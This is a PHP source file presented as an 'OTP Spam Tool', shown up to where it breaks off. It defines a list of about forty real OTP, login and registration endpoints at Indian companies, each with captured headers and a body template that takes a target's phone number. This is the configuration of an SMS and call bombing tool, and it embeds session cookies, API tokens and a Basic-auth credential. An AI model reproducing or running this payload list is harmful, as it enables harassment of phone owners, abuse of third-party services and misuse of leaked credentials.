<?php
// OTP Spam Tool - Educational Use Only (Full Version with 58 APIs)
// Handles all provided APIs

// Array of APIs: each is an array with 'method', 'url', 'headers', 'data_template'
$apis = [
    // APIs 1-21 (from previous updates)
    1 => [
        'name' => 'My11Circle Resend OTP',
        'method' => 'POST',
        'url' => 'https://www.my11circle.com/api/fl/auth/v1/resendOtp',
        'headers' => [
            'Host: www.my11circle.com',
            'accept: application/json, text/plain, */*',
            'user-agent: {"AppVersion":"11100.92","OSVersion":"9","appFlavorName":"reverie_playstore","reverieFlavorName":"reverie_playstore","pokerFlavourName":"","ludoFlavourName":"","isRCOnly":false,"isMecDownloaded":true}Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/135.0.7049.99 Mobile Safari/537.36 (/ftprimary:295/) [FTAndroid/11100.92] [MECPlayStoreAndroid/11100.92]',
            'sentry-trace: 137648fac4264fd5884d97e48657cada-a7a4ab1930ca3ffa',
            'baggage: sentry-environment=production,sentry-release=reverie@11100.92,sentry-public_key=c98826b2f6da41828e8d15cb444185ba,sentry-trace_id=137648fac4264fd5884d97e48657cada',
            'content-type: application/json',
            'accept-encoding: gzip'
        ],
        'data_template' => '{"otpOnCall":true,"otpType":6,"mobile":"%s"}'
    ],
    
        2 => [
        'name' => 'Vedantu PreLogin Verification',
        'method' => 'POST',
        'url' => 'https://user.vedantu.com/user/preLoginVerification',
        'headers' => [
            'Host: user.vedantu.com',
            'accept: application/json, text/plain, */*',
            'x-ved-device: ANDROID',
            'x-ved-token: undefined',
            'content-type: application/json',
            'accept-encoding: gzip',
            'user-agent: okhttp/4.9.2'
        ],
        'data_template' => '{"phoneCode":"+91","phoneNumber":"%s","event":"APP_FLOW","sType":"VEDANTU_A_1_APP","sValue":"omxl5XwsPPVbqhJco0z01FO6TyMIWEAy","requestSource":"ANDROID","appVersionCode":"2.7.2"}'
    ],
    3 => [
        'name' => 'Testbook Send OTP (SMS)',
        'method' => 'POST',
        'url' => 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=%s&otpSentVia=sms&appType=tb&src=LoginOtpFragment&resend=false&language=English',
        'headers' => [
            'Host: api.testbook.com',
            'authorization: Bearer ',
            'x-tb-client: tbapp,9050003',
            'ssid: ',
            'test-apk: false',
            'expset: 00000',
            'content-length: 0',
            'accept-encoding: gzip',
            'user-agent: okhttp/4.11.0'
        ],
        'data_template' => ''
    ],
    4 => [
        'name' => 'Testbook Send OTP (Call)',
        'method' => 'POST',
        'url' => 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=%s&otpSentVia=call&appType=tb&src=LoginOtpFragment&resend=true&language=English',
        'headers' => [
            'Host: api.testbook.com',
            'authorization: Bearer ',
            'x-tb-client: tbapp,9050003',
            'ssid: ',
            'test-apk: false',
            'expset: 00000',
            'content-length: 0',
            'accept-encoding: gzip',
            'user-agent: okhttp/4.11.0'
        ],
        'data_template' => ''
    ],
    5 => [
        'name' => 'KreditBee OTP',
        'method' => 'PUT',
        'url' => 'https://api.kreditbee.in/v1/me/otp',
        'headers' => [
            'Host: api.kreditbee.in',
            'content-length: 434',
            'accept: application/json, text/plain, */*',
            'authorization: Bearer null',
            'x-kb-info: eyJsYXQiOiIwIiwibG5nIjoiMCIsImRpZCI6ImI0NjI3ODQ5YWM0MzEwMzkiLCJhcHB0eXBlIjoiYW5kcm9pZCIsImFwcHZlciI6IjIuMi4xIiwiaXNyb290ZWQiOiIxIn0=',
            'user-agent: Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36',
            'content-type: application/json',
            'origin: https://mix.kreditbee.in',
            'x-requested-with: com.kreditbee.android',
            'sec-fetch-site: same-site',
            'sec-fetch-mode: cors',
            'sec-fetch-dest: empty',
            'referer: https://mix.kreditbee.in/loginwithmob/mobileform',
            'accept-encoding: gzip, deflate',
            'accept-language: en-GB,en-US;q=0.9,en;q=0.8'
        ],
        'data_template' => '{"reason":"loginOrRegister","mobile":"%s","appsflyerId":"1756048611494-7042637265548576511","cleverTapId":"__4448954108e34307a7c1919b8b6ec616","gaid":"00877f3d-a7ad-4100-83d1-d34b9486a1c7","mediaSource":"","firebaseInstanceId":"663633fb0ff242622293433fecfbe225","firebaseiosAppInstId":"","campaign":"","appType":"android","afDp":"","afWebDp":"","afStatus":"Organic","afMessage":"organic install","deviceId":"b4627849ac431039"}'
    ],
    6 => [
        'name' => 'Bewakoof Login OTP',
        'method' => 'POST',
        'url' => 'https://api-prod.bewakoof.com/v3/user/auth/login/otp',
        'headers' => [
            'access-control-allow-origin: *',
            'preferred-location: IN',
            'api-token: ZmQ2ODBhM2UzMzc0Zjg1YTExZGZmZTM0MTRmNzYyMmY6YTMyODBiM2YtYjczZi00OGFkLWFlZGMtNTVmOTNlYjk4ZGI3',
            'app-version: 224',
            'client-device-token: ZmQ2ODBhM2UzMzc0Zjg1YTExZGZmZTM0MTRmNzYyMmY6YTMyODBiM2YtYjczZi00OGFkLWFlZGMtNTVmOTNlYjk4ZGI3',
            'Content-Type: application/json',
            'Host: api-prod.bewakoof.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip',
            'Cookie: trkId=839a4c6a-150f-4f5e-9ca9-d512f2da4d3c; polaris_session=68ab3309298bb0211673d3d2',
            'User-Agent: okhttp/4.9.2'
        ],
        'data_template' => '{"mobile":"%s","country_code":"+91"}'
    ],
    7 => [
        'name' => 'CityMall Get OTP (Full)',
        'method' => 'POST',
        'url' => 'https://cf.citymall.live/api/cl-user/auth/get-otp',
        'headers' => [
            'Host: cf.citymall.live',
            'accept: application/json, text/plain, */*',
            'x-app-name: CX',
            'x-app-version: 1.42.2',
            'x-app-version-cp: 1.42.2-cms-v2',
            'x-app-version-code: 260',
            'x-ios-app-code: 15',
            'x-app-package: live.citymall.customer.prod',
            'x-app-path: /data/user/0/live.citymall.customer.prod',
            'use-applinks: true',
            'x-platform-os: android',
            'x-telemetry: 1756050277668',
            'content-type: application/json',
            'accept-encoding: gzip',
            'user-agent: okhttp/4.9.2'
        ],
        'data_template' => '{"phone_number":"%s","unique_device_id":"c095ed5e5e9c8541","cl_user_id":null,"idfa":"00877f3d-a7ad-4100-83d1-d34b9486a1c7","device_info":"{\"device_fingerprint\":\"google/marlin/marlin:9/PQ3A.190801.002/android-build11210828/gp:user/release-keys\",\"device_type\":\"Handset\",\"carrier\":\"Vi India\",\"device\":\"marlin\",\"os\":\"android\",\"ip\":\"192.168.22.102\",\"ver\":\"260\",\"os_version\":\"9\",\"brand\":\"google\",\"model\":\"smdk6400\"}","tracking_info":"{\"referrer\":{\"installReferrer\":\"utm_source=google-play&utm_medium=organic\",\"referrerClickTimestampSeconds\":\"0\",\"installBeginTimestampSeconds\":\"0\",\"referrerClickTimestampServerSeconds\":\"0\",\"installBeginTimestampServerSeconds\":\"0\",\"installVersion\":null,\"googlePlayInstant\":\"false\"},\"app_store\":\"GOOGLE\"}","source":"app","otpEscape":true}'
    ],
    8 => [
        'name' => 'CityMall Get OTP (Simple)',
        'method' => 'POST',
        'url' => 'https://cf.citymall.live/api/cl-user/auth/get-otp',
        'headers' => [
            'Host: cf.citymall.live',
            'accept: application/json, text/plain, */*',
            'x-app-name: CX',
            'x-app-version: 1.42.2',
            'x-app-version-cp: 1.42.2-cms-v2',
            'x-app-version-code: 260',
            'x-ios-app-code: 15',
            'x-app-package: live.citymall.customer.prod',
            'x-app-path: /data/user/0/live.citymall.customer.prod',
            'use-applinks: true',
            'x-platform-os: android',
            'x-telemetry: 1756050304781',
            'content-type: application/json',
            'accept-encoding: gzip',
            'user-agent: okhttp/4.9.2'
        ],
        'data_template' => '{"phone_number":"%s"}'
    ],
    
    10 => [
        'name' => 'Shadowfax Send OTP',
        'method' => 'POST',
        'url' => 'https://api.shadowfax.in/delivery/otp/send/v2/',
        'headers' => [
            'Host: api.shadowfax.in',
            'authorization: Token OR1ZPU7MXE5OYTNQM2UYG320XDUSFFOQOVEFZZXT291G96AEFU2J7EI2DBDL',
            'referrer: flash',
            'version: 54',
            'version-name: 2.10.2',
            'content-type: application/json; charset=utf-8',
            'accept-encoding: gzip',
            'user-agent: okhttp/4.12.0'
        ],
        'data_template' => '{"mobile_number":"%s"}'
    ],
    
    12 => [
        'name' => '2Factor SMS (GET)',
        'method' => 'GET',
        'url' => 'https://2factor.in/API/V1/7ce280d5-97e3-4811-aaae-69bdd2206489/SMS/%s/AUTOGEN',
        'headers' => [
            'Host: 2factor.in',
            'accept-encoding: gzip',
            'user-agent: okhttp/4.9.0'
        ],
        'data_template' => ''
    ],
    13 => [
        'name' => 'Unacademy User Check (OTP Type 1)',
        'method' => 'POST',
        'url' => 'https://api.unacademy.com/v3/user/user_check/?enable-email=true',
        'headers' => [
            'Host: api.unacademy.com',
            'user-agent: UnacademyLearningAppAndroid/6.148.0 Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)',
            'x-app-version: 197350',
            'x-app-build-version: 6.148.0',
            'x-platform: 5',
            'device-id: CFE11719D5EB3134A2876F6269714C61BBED92EF',
            'x-screen-name: Login_-_Mobile_Login',
            'content-type: application/json; charset=UTF-8',
            'accept-encoding: gzip'
        ],
        'data_template' => '{"country_code":"IN","phone":"%s","send_otp":true,"otp_type":1,"app_hash":"uI6w7mnt583"}'
    ],
    14 => [
        'name' => 'Unacademy User Check (OTP Type 2)',
        'method' => 'POST',
        'url' => 'https://api.unacademy.com/v3/user/user_check/?enable-email=true',
        'headers' => [
            'Host: api.unacademy.com',
            'user-agent: UnacademyLearningAppAndroid/6.148.0 Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)',
            'x-app-version: 197350',
            'x-app-build-version: 6.148.0',
            'x-platform: 5',
            'device-id: CFE11719D5EB3134A2876F6269714C61BBED92EF',
            'x-screen-name: Login_-_OTP_Verify',
            'content-type: application/json; charset=UTF-8',
            'accept-encoding: gzip'
        ],
        'data_template' => '{"country_code":"IN","phone":"%s","email":"","send_otp":true,"otp_type":2,"app_hash":"uI6w7mnt583"}'
    ],
    15 => [
        'name' => 'Unity Ads Diagnostics',
        'method' => 'POST',
        'url' => 'https://gateway.unityads.unity3d.com/legacy/diagnostics/v2/metrics',
        'headers' => [
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)',
            'Host: gateway.unityads.unity3d.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"msr":"5","m":[{"n":"native_show_started","t":{"state":"initialized_successfully"}}],"t":{"sendShowConsentEvent":"true","osg":"true","tsi_p":"true","tsi_upii":"false","wgr":"true","iso":"in","src":"srvc","gjl":"true","tsi":"false","sto":"30000","system":"9","plt":"android","tm":"false","sdk":"4.9.1","prvc":"allowed"},"shSid":"09c93147-3929-4ea0-bac3-d83477b0f9a6","apil":"28","sTkn":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhYmciOjAsImFnIjoiMkxCK1o5aUEzQ1hpbExBUFBpNmgvV0ZJNVEzd2JlNFpTbERBbDkyTEx0NTZxcStxck1yR3NXa3o3RklLU0kvUmdmR1B3QT09IiwiYXBwIjowLCJhcHBMZXZlbENvcHBhIjpmYWxzZSwiYXIiOiJNQ2ZqRTdXZ2duWGlPeTFVSmN3Q094blNXZ1ZOOVN2SmEvTlRjQUFFY1JJb2hwaFlFWUZ3akdXb3BlQndINjAyU0p1NWJOKzdrd29QcitlRjM0SDladz09IiwiYXR0IjowLCJhdWMiOjIyNSwiYXVpIjoxODcsImF6cCI6ImYwZmI0N2FiLThmMTItNDA4Yi04OTYwLTUxYWUwZmY3NDg5NyIsImJzdCI6NCwiY2FsY3VsYXRlZENvcHBhIjpmYWxzZSwiY29uc2VudCI6ZmFsc2UsImNvbnRleHR1YWxPbmx5IjpmYWxzZSwiY291bnRyeSI6IklOIiwiY3BpIjoyMjgsImNyZWF0ZWQiOjE3NTIxNTI0MjkwMDAsImRsdCI6MCwiZHQiOjAsImV0dCI6WzIxNDc0ODM4ODQsNjExMDAsNTgyMzksNTgxNjRdLCJleHAiOjE3NTcyNjE1MTYsImlhcCI6MjAwLCJpYXQiOjE3NTYwNTE5MTYsImlnIjoiS3E2eDFmejJ1bWprTDBOMzQ2QXFmN3h5ZDN6d1RNakxCWmdjajFVSzVZSWpmN1hBZi9WalYrekUzLytsSmxOaitwQkdQZz09IiwiaXIiOiJRQkxwUldGNnVVc1FKQWM0SmNPMzBPZU4xRWhYZlk1Vk5ZaVo3d250WkF2d1RuSnJoU2tIUnphWjZzWi84VjRnd05CNGVxUDF3VVJZYUY4TVFCMlh3QT09IiwiaXNzIjoiYWRzLXNkay1jb25maWd1cmF0aW9uLnVuaXR5YWRzLnVuaXR5M2QuY29tIiwibGVnYWxUZXJyaXRvcnkiOjAsImxnbGYiOiJub25lIiwibHR2Ijo0NCwibWl4ZWQiOmZhbHNlLCJwcm8iOjIyNiwicHJveGllZCI6ZmFsc2UsInNiZHZzIjoiTVAiLCJzcyI6IjA5YzkzMTQ3LTM5MjktNGVhMC1iYWMzLWQ4MzQ3N2IwZjlhNiIsInN1YiI6IjRZWFp0V2NpVG9hSi9LbE52TnhYV3FKUTY0Vk1sWGh2b0g3MW5qMWZnVUM0UVlvKzFLb2dyRFJwTzluaEcyTWpoR1VmYlE9PSIsInRndCI6NzgsInVnaWQiOiI3RmtTbEhlWTcwT2hFRFF2cnk0aU5xSjB0bklpcEVaVENwbmZDRkg2ZTBVYXdZSXlTRTR5Y3pyTUJTeUhUZ015N0ltZEp1WmRpZXJQd3BYZnBhRER6UT09IiwidWdpdCI6MCwidXZzIjp7ImFsZ28iOiJ0cyIsInRyIjoxfSwieHByIjoxMjB9.I9k8_n9TU179LE9Z1p55EpVkUM26Cx9FXAkkcRqu5hs","deviceModel":"Pixel 4","deviceName":"marlin","deviceMake":"google","gameId":"5514341"}'
    ],
    16 => [
        'name' => 'Fleshia Bomb SMS',
        'method' => 'POST',
        'url' => 'https://fleshia.com/antitoolz/bomb/sms',
        'headers' => [
            'Content-Type: application/json; charset=utf-8',
            'User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)',
            'Host: fleshia.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"deviceid":"4362bd8ac31ee49f","number":"%s","token":"ZKu1NBMqfMsaJflSDP4zpQ=="}'
    ],
    17 => [
        'name' => 'Aarki Spire Image Fetch',
        'method' => 'GET',
        'url' => 'https://spire.aarki.net/v1/ads/ac8211f72184dac65ee6d75895380740/media/195617cb8511a1426104bc79bec66e87_720x1280_P15_0-00-14-29_.jpg',
        'headers' => [
            'Host: spire.aarki.net',
            'pragma: no-cache',
            'cache-control: no-cache',
            'user-agent: Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36',
            'accept: image/webp,image/apng,image/*,*/*;q=0.8',
            'x-requested-with: com.kalwar.antitoolz',
            'sec-fetch-site: cross-site',
            'sec-fetch-mode: no-cors',
            'sec-fetch-dest: image',
            'accept-encoding: gzip, deflate',
            'accept-language: en-GB,en-US;q=0.9,en;q=0.8'
        ],
        'data_template' => ''
    ],
    18 => [
        'name' => 'Animall Auth Login',
        'method' => 'POST',
        'url' => 'https://animall.in/zap/auth/login',
        'headers' => [
            'User-Agent: okhttp/5.0.0-alpha.11',
            'Accept-Encoding: gzip',
            'Content-Type: application/json; charset=UTF-8',
            'Host: animall.in',
            'Connection: Keep-Alive'
        ],
        'data_template' => '{"phone":%s,"signupPlatform":"NATIVE_ANDROID"}'
    ],
    19 => [
        'name' => 'Supreme Mobiles Send OTP',
        'method' => 'POST',
        'url' => 'https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp',
        'headers' => [
            'referer: https://suprememobiles.in/',
            'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
            'origin: https://suprememobiles.in',
            'action: sendOTP',
            'content-type: application/json',
            'priority: u=1, i',
            'shop_name: supreme-mobiles.myshopify.com',
            'accept: */*',
            'User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)',
            'Host: omqkhavcch.execute-api.ap-south-1.amazonaws.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"username":"+91%s","type":"mobile","domain":"suprememobiles.in","recaptcha_token":""}'
    ],
    20 => [
        'name' => 'Onsite Teams Register',
        'method' => 'POST',
        'url' => 'https://api.onsiteteams.in/apis/v3/register',
        'headers' => [
            'User-Agent: okhttp/3.14.9',
            'Accept-Encoding: gzip',
            'Content-Type: application/json; charset=UTF-8',
            'Host: api.onsiteteams.in',
            'Connection: Keep-Alive'
        ],
        'data_template' => '{"country_code":"91","mobile":%s,"name":""}'
    ],
    21 => [
        'name' => 'RailMadad Register',
        'method' => 'POST',
        'url' => 'https://railmadad.indianrailways.gov.in/madad/api/secureuser/register',
        'headers' => [
            'Origin: http://localhost',
            'Accept: application/json, text/plain, */*',
            'X-Requested-With: cris.railmadad',
            'Connection: keep-alive',
            'User-Agent: Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.028; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36',
            'Referer: http://localhost/',
            'Sec-Fetch-Site: cross-site',
            'Sec-Fetch-Dest: empty',
            'Host: railmadad.indianrailways.gov.in',
            'Accept-Encoding: gzip, deflate',
            'Sec-Fetch-Mode: cors',
            'Authorization: Basic ZXh0ZXJuYWx1c2VyOm1AZEBkYWRtMW4=',
            'Accept-Language: en-US,en;q=0.9',
            'Content-Type: application/json'
        ],
        'data_template' => '{"uMobile":"%s","cpassword":"17092002","password":"17092002","username":"jat1520"}'
    ],
    // APIs 22-37 (from second update)
    22 => [
        'name' => 'GoPaySense Users OTP',
        'method' => 'POST',
        'url' => 'https://api.gopaysense.com/users/otp',
        'headers' => [
            'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
            'cookie: WZRK_G=466bfb3ffeed42af94539ddb75aab1a3; WZRK_S_8RK-99W-485Z=%7B%22p%22%3A1%2C%22s%22%3A1716292040%2C%22t%22%3A1716292041%7D; _ga=GA1.2.470062265.1716292041; _gid=GA1.2.307457907.1716292041; _gat_UA-96384581-2=1; _fbp=fb.1.1716292041396.1682971378; _uetsid=e4457600176711efbd4505b1c7173542; _uetvid=e445bdd0176711efbe4db167d99f3d78; _ga_4S93MBNNX8=GS1.2.1716292043.1.0.1716292052.51.0.0; _ga_F7R96SWGCB=GS1.1.1716292040.1.1.1716292052.0.0.0',
            'origin: https://www.gopaysense.com',
            'content-type: application/json',
            'priority: u=1, i',
            'accept: */*',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Host: api.gopaysense.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"phone":"%s"}'
    ],
    
    24 => [
        'name' => 'ConfirmTkt Register Output (GET)',
        'method' => 'GET',
        'url' => 'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=%s&newOtp=true&retry=false&testparamsp=true',
        'headers' => [
            'Cookie: __cf_bm=uaftwu7eQJF4UuKfBI484VwBKp8BimhTbJcv.WwOm8s-1720165274-1.0.1.1-bqC3YKX_5YDm.fcvHyqNWRV3i82A.4aaLxTROYmg6ak4AMormQ40No_uB2ud1MM_u92w27RzGxs7HZrkrUH7Ig; _cfuvid=a9S5P7n8QL3EhDmImDSLG0zWSLyVomIrxgPyVvzjE8A-1720165274210-0.0.1.1-604800000',
            'User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)',
            'Host: securedapi.confirmtkt.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => ''
    ],
    
    26 => [
        'name' => 'Gigin Register',
        'method' => 'POST',
        'url' => 'https://ai.gigin.ai/live_app_api/index.php/api_controller/register',
        'headers' => [
            'Origin: https://localhost',
            'Accept: application/json, text/plain, */*',
            'X-Requested-With: com.giginap.jobs',
            'Connection: keep-alive',
            'User-Agent: Mozilla/5.0 (Linux; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.028; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36',
            'Referer: https://localhost/',
            'Sec-Fetch-Site: cross-site',
            'Sec-Fetch-Dest: empty',
            'Host: ai.gigin.ai',
            'Accept-Encoding: gzip, deflate',
            'Sec-Fetch-Mode: cors',
            'Accept-Language: en-US,en;q=0.9',
            'Content-Type: application/json'
        ],
        'data_template' => '{"Mobile":"%s","type":"Android","SID":null,"rel_id":null,"version":"4.6.2","deviceModel":"sdk_gphone_x86_64","deviceVersion":"13","deviceManufactur":"Appetize.io"}'
    ],
    27 => [
        'name' => 'Mpaani Send OTP',
        'method' => 'POST',
        'url' => 'https://homedeliverybackend.mpaani.com/auth/send-otp',
        'headers' => [
            'client-code: vulpix',
            'content-type: application/json',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Host: homedeliverybackend.mpaani.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"phone_number":"%s","role":"CUSTOMER"}'
    ],
    28 => [
        'name' => 'Revmaxx Login OTP Send',
        'method' => 'POST',
        'url' => 'https://api.bbaws.revmaxxtec.com/prod/v1/login/otp/send',
        'headers' => [
            'User-Agent: okhttp/3.12.12',
            'Accept: application/json, text/plain, */*',
            'Cache-Control: no-cache',
            'Content-Type: application/json',
            'Host: api.bbaws.revmaxxtec.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"phone":"%s"}'
    ],
    29 => [
        'name' => 'Mamaearth Initiate Signup',
        'method' => 'POST',
        'url' => 'https://auth.mamaearth.in/v1/auth/initiate-signup',
        'headers' => [
            'Cookie: AWSALB=B7foySmYZxY9mDL7N7VOGpEfe5NlJyYr8GFV+6PSj/S6S2HzVSrUizel6sH902tdw9AhUOxGoVlKZ9FNCLKQy5QnYlBRt+UBkaIstpVRmRDgwk9K3SBhVIb1jRGq; AWSALBCORS=B7foySmYZxY9mDL7N7VOGpEfe5NlJyYr8GFV+6PSj/S6S2HzVSrUizel6sH902tdw9AhUOxGoVlKZ9FNCLKQy5QnYlBRt+UBkaIstpVRmRDgwk9K3SBhVIb1jRGq',
            'content-type: application/json;charset=UTF-8',
            'priority: u=1, i',
            'origin: https://mamaearth.in',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Host: auth.mamaearth.in',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"mobile":"%s","referralCode":""}'
    ],
    30 => [
        'name' => 'Chemist180 Send Verification Code',
        'method' => 'POST',
        'url' => 'https://api.chemist180.com/api/customer/send-verification-code',
        'headers' => [
            'Origin: https://chemist180.com',
            'Connection: keep-alive',
            'Referer: https://chemist180.com/',
            'Accept: */*',
            'Content-Type: application/json',
            'User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)',
            'Host: api.chemist180.com',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"number":"%s"}'
    ],
    31 => [
        'name' => 'Metropolis Customer Login',
        'method' => 'POST',
        'url' => 'https://www.metropolisindia.com/customerlogin',
        'headers' => [
            'Cookie: AWSALB=nf8n5exeLtpXpie/WOqAZYEUxBmjjGdU5FbnlAydksu3DF05pA9aVZziy8EstSB6swwxejFuP8457HNwXKtRrw7Kp7akO4f8YnQZdYiIl6PVfyX5FkuNdqSapeVR; AWSALBCORS=nf8n5exeLtpXpie/WOqAZYEUxBmjjGdU5FbnlAydksu3DF05pA9aVZziy8EstSB6swwxejFuP8457HNwXKtRrw7Kp7akO4f8YnQZdYiIl6PVfyX5FkuNdqSapeVR; metropolis_session=qpoJnwgP4BCPp90VKB4QFaiBIn1sXv9ML2WkIeWU',
            'referer: https://www.metropolisindia.com/',
            'origin: https://www.metropolisindia.com',
            'x-requested-with: XMLHttpRequest',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'x-csrf-token: JkI5jQn0n91aE9Ao8zTnHuPPybU7KetEgAQT2Hu3',
            'accept: */*',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Host: www.metropolisindia.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => 'addbasket_id=&addbasket_type=&login_input=%s&isaddbasket=no&'
    ],
    32 => [
        'name' => 'Itechstore Send Login OTP',
        'method' => 'POST',
        'url' => 'https://itechstore.co.in/home/send_login_otp',
        'headers' => [
            'Cookie: ci_session=gei1ug6sfrv9fqhet62amce88vpgag97',
            'referer: https://itechstore.co.in/user/login',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'origin: https://itechstore.co.in',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Host: itechstore.co.in',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => 'mobile=%s&'
    ],

    34 => [
        'name' => 'Aakash Generate Lead OTP',
        'method' => 'POST',
        'url' => 'https://antheapi.aakash.ac.in/api/generate-lead-otp',
        'headers' => [
            'sec-fetch-mode: cors',
            'content-type: application/json',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Host: antheapi.aakash.ac.in',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"mobile_psid":"%s","mobile_number":"","activity_type":"aakash-myadmission","webengageData":{"profile":"student","whatsapp_opt_in":true,"method":"mobile"}}'
    ],
    35 => [
        'name' => 'Redcliffe Send OTP (Website)',
        'method' => 'POST',
        'url' => 'https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false',
        'headers' => [
            'Cookie: gDeviceId=1dd5fbaf-338d-4094-b535-749f26749886',
            'Content-Type: application/json; charset=utf-8',
            'User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)',
            'Host: api.redcliffelabs.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"phone_number":"%s","short":true}'
    ],
    36 => [
        'name' => 'HashtagLoyalty Create OTP',
        'method' => 'POST',
        'url' => 'https://dashboardapi.hashtagloyalty.com/v3/sign_up/create_otp',
        'headers' => [
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Host: dashboardapi.hashtagloyalty.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => 'mobile=%s&'
    ],
    37 => [
        'name' => 'Brevistay Login',
        'method' => 'POST',
        'url' => 'https://www.brevistay.com/cst/app-api/login',
        'headers' => [
            'authorization: Bearer null',
            'Cookie: PHPSESSID=9cu4hfb0ts24k78danbt8k1g8c',
            'brevi-channel: DESKTOP_WEB',
            'brevi-channel-version: 40.0.0',
            'content-type: application/json',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'Host: www.brevistay.com',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"is_otp":1,"is_password":0,"mobile":"%s"}'
    ],
    // APIs 38-58 (from latest update)
    38 => [
        'name' => 'NatureFit Local Signup',
        'method' => 'POST',
        'url' => 'https://nfapi.naturefit.in/api/auth/localsignup',
        'headers' => [
            'Connection: keep-alive',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8',
            'Content-Type: application/json;charset=UTF-8',
            'Host: nfapi.naturefit.in',
            'Accept-Encoding: gzip'
        ],
        'data_template' => '{"mobile":"%s","otp":4521,"name":null,"password":null}'
    ],
    39 => [
        'name' => 'Rajkumari Send Login OTP',
        'method' => 'POST',
        'url' => 'https://www.rajkumari.co/Login/sendLoginOtp',
        'headers' => [
            'Cookie: PHPSESSID=7f48437bf2415660b5646987b6c08f806b5fcc27',
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)',
            'Host: www.rajkumari.co',
            'Connection: Keep-Alive',
            'Accept-Encoding: gzip'
        ],
        'data_template' => 'referral=&url=&pagename=&username=%s&'
    ],
    40 => [
